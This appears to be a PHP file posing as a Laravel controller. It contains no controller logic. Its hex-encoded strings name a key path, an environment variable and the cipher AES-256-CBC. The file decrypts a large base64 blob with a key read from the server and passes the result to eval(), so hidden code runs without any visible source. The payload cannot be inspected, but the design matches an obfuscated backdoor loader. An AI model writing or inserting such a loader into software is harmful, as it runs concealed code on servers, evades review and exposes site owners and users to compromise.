<?php
namespace App\Http\Controllers\Sistem;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('6LXJjB6+tbQQ8zjtbXUiQg==');

$c=base64_decode(

'dM0oEl/RgFvXMsS0z5ZHCeFy8/ZEiMlDglG2+vXMWBC/10NZP7V31CdsH710aPqVpIrmvKriQFoO' .
'IYY6PoZHPOcPQUmQ7qNWRWWqqpb1MqYsCQf5mHvUqRphrEJUp55Th1ZnWdK38N+9mssqpgKbJIsL' .
'63BhJHWtpiMMNfivJx32nFkbHnr4P5LMxj6Vsm/Z3HDrhjYk10pFiZ1t8CYZ9pcB2AOVUbRqfzbE' .
'PjDCw80XMqXXTUhDvLvVXMgVb8wNqlMXg7d67jpt6MT69tk+f1WkxVrerdVZDo7MfkyD0b71u4UM' .
'IZ0WwfWSD72rY/lnCe+1xgaKgwXKnAvu5/IvMgooKZQzRnO89SR7IUfrcstW3d7Ce+Ka5ZSaeUcB' .
'IlaaQbx9wotfXHWkOII/8C8lteaVWbbanfpu0lYtdN2pViwbR1DlIxJ4UiUdeRLQEC1rBnjYH5nE' .
'GnS+spg9pUnIFJVR1v5JTN+kl397sq/YBf2XA3jkYFo9bMu6IPguVrP3DIEwzXTEPZKrfkm3vKLx' .
'lMrWwLbu06g+Bft6boHD86Ya/rxIQwZfkCbaVjdEo/X3SsRUzi+uILkuEPNAy4au8Nf9Vros/5Z2' .
'ihRHfMLBlHRVlNEmFGyTzBzEL8sZNM7j5lKG/8IFYoDsyx0lT4L6V78TChZj47oVnmb87909KGWX' .
'1mz4UCWj+2tM31HtCLAZ4qIAjXaaEkBJyVq/GC42aRapLAi9Z4QzevPs7jGiCo8TPQQMkjgXx3s2' .
'oCVOzTepvKaCWUUvQcDqbtOh6PVpSVbpm9Loa733DA8v4gQkwpnqWyk4C7nZ4cRKDudLGpQgF79W' .
'KRkmwNcLxn2Wpl9mksUHeztlK3yqn3kJxWJTFXi192XjGWdS+wvoVzqbzEQHwfP4YynCcfBSvKLt' .
'UPZBUH5g+2zgN9yWcdPbPoHeVmz+Li9g8C8Ff6t2smAEIrNeVGe1U/Hxm0N/9zy7lBQUBlOGezBP' .
'JR3H/7RErjO3Z4aQnJYAie4WYnMIdc0tiyp4bFKv3SckrhXQ8SeATyLk+u7kti5BR+wtKkNmFgvR' .
'rnBvDV9j/AdolNOr8s9Ta/XS3k4sA4lCHoDqyTnceKDWZqlpxsFTTEek8R1fFnyZXmnbrEnfYrX6' .
'ygl3A280UiE8pjr4J8RYLYpWR44r+ZSuGVxgvOkQzSP8QPWbwxFMyDM8iBVjBZqDlxxGY/01MtWq' .
'/fqLTvdk73VQe88spxquqx4PJxCHAj6EaDm0meAmac1EgG5fu0XvCsTwa8xUtohY6alaT1TAUMAl' .
'LXdd/9PKNDkH8wC/1+9yqJ8fklPkk8lKO1IP3cT50kWdirIpX0CFDMhIuL/FGdYGSauYvIHB3fk5' .
'vQ+yRkj4nKZwtmqnoP6oubzQTHLNy7Q86PaMWjTZFIVr+6EAtpp31qPUW61GxD01KyL00crZsNzY' .
'qHwJlvXVkJKjcbHMQMXJIYWMZkrqjdVMn6PxeqB5RUnhN1qQRMqyC00NLHhPH+zzU63QvkllytyI' .
'F8ptdn/MSMh5yjNMah+4awV7t1saX6+7yAtkmf/7FbimW327EBdmsNr/ksuMObBXY1cDBzl8Su4W' .
'msDyMSLO0C6wAdDMtnHEo6rQOIeVdVW0WhgQja40G2T7LMdRB0d5JOP0hrSPt4FKLMZzc1qLvHCa' .
'I7Uc8ipwbLf4Gk21rmI+f5MeJk+I4b/XyoKvqFAUkk0TWY0aQWqQozoPK/IpGjaMAFGR4zgvQNvs' .
'vWAWMxlYeF14f/8ltIXVZ+JaWqGdGG6OPuk3B6RPAmWs43Lq2I9vIVjBCEFXUV8li1linrKy8yiQ' .
'OSp3K75qpBJYUqeFwzO1lwLJRtDvNVLN/aC4T1jSRfaVJ3fGo59XcvZLV/hPqrTwEqS80FwqjhB1' .
'm/T3euou07eM1Mh30IZjZPib08vHhhy0N3vCBxdaahjyVrLcHS/7XusBjFL1xQxN+k7lzWhl0RHx' .
'pCHHqNmTpcdmgkA4QFlka8OUh9SBdAWJvIIbXuhx5pGhLjq2FnWPby7Xzo6MhqUMouoLVcBNzVG4' .
'CW+R7cSj8cgsoxIxFq4EqBx6eXlstGCtgnoZM6xM2Qe47ONrifGBUQ6PBQtkoF2jXoXDpMenKnBp' .
'p20ds8ENh7lpcwUEz/x2KNlWuHdLHogzAg0wcAjOadP92yjfiZET5DJ47L5KyGICH0UrKB+Qd5TQ' .
'09R9WB4CaswHKiJM5hf7oFL9sJzs1Ms0tzRyZkPL8zWXx9A+h0Xs/VlZes3B8JrhEu6fdgbxt6SX' .
'3Hj/FZTlLexVCjgvYtUznFG33dlOy5pL0Qbx7lBaufJUKQkHaZ0Lsj1Pd8zEwHS0qbI3dIdADdPG' .
'e9/w73Wpj0KAe0EftroEybn8F/GFFeMsj7QoETjuVtE8gKv7KA3VZRtajM/bM4lS1efQnmXdDyn1' .
'8kH9YAL+YFpBGo/E53+ba4egL/G66NskWwB94uhNQGiHzPgSow9dm4GRupz/Tocsakr1uSFfBO+U' .
'7ZbOPKRCVWsU6XACJ4G+48dFgkTraaQCw43UpSngDITNqS6TPvDprJrZKt51ZH2Dun4da+1/lA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

